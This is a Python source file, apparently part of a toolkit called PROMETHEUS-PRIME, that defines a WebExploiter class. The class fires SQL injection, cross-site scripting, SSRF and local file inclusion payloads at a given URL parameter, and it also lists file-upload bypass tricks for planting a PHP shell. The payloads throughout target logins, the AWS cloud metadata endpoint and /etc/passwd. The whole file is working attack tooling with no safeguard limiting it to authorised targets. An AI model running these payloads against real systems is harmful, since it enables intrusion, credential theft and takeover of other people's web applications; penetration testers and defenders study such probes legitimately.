"""
PROMETHEUS-PRIME Web Application Security
SQLi, XSS, SSRF, File Upload, Authentication Bypass
"""
import requests
from typing import List, Dict, Optional
from urllib.parse import urljoin, quote
import re

class WebExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def sql_injection_test(self, url: str, param: str) -> List[Dict]:
        """Test for SQL injection"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' AND SLEEP(5)--"
        ]
        
        results = []
        for payload in payloads:
            test_url = f"{url}?{param}={quote(payload)}"
            try:
                resp = self.session.get(test_url, timeout=10)
                if "error" in resp.text.lower() or "sql" in resp.text.lower():
                    results.append({'payload': payload, 'vulnerable': True})
            except:
                pass
        
        return results
    
    def xss_test(self, url: str, param: str) -> List[Dict]:
        """Test for XSS"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<svg/onload=alert('XSS')>"
        ]
        
        results = []
        for payload in payloads:
            test_url = f"{url}?{param}={quote(payload)}"
            try:
                resp = self.session.get(test_url)
                if payload in resp.text:
                    results.append({'payload': payload, 'vulnerable': True, 'reflected': True})
            except:
                pass
        
        return results
    
    def ssrf_test(self, url: str, param: str) -> Dict:
        """Test for SSRF"""
        test_targets = [
            "http://localhost:80",
            "http://127.0.0.1:22",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "file:///etc/passwd"
        ]
        
        for target in test_targets:
            test_url = f"{url}?{param}={quote(target)}"
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200:
                    return {'vulnerable': True, 'payload': target}
            except:
                pass
        
        return {'vulnerable': False}
    
    def file_upload_bypass(self) -> List[str]:
        """File upload bypass techniques"""
        return [
            "Change extension: .php -> .php.jpg",
            "MIME type mismatch",
            "Double extension: shell.php.png",
            "Null byte: shell.php%00.png",
            "Case variation: shell.PhP",
            "Add magic bytes to PHP file"
        ]
    
    def jwt_manipulation(self, token: str) -> Dict:
        """JWT token analysis"""
        import base64
        parts = token.split('.')
        
        if len(parts) != 3:
            return {'error': 'Invalid JWT'}
        
        try:
            header = base64.b64decode(parts[0] + '==').decode()
            payload = base64.b64decode(parts[1] + '==').decode()
            return {'header': header, 'payload': payload}
        except:
            return {'error': 'Decode failed'}
    
    def lfi_test(self, url: str, param: str) -> List[str]:
        """Local File Inclusion test"""
        payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd"
        ]
        return payloads
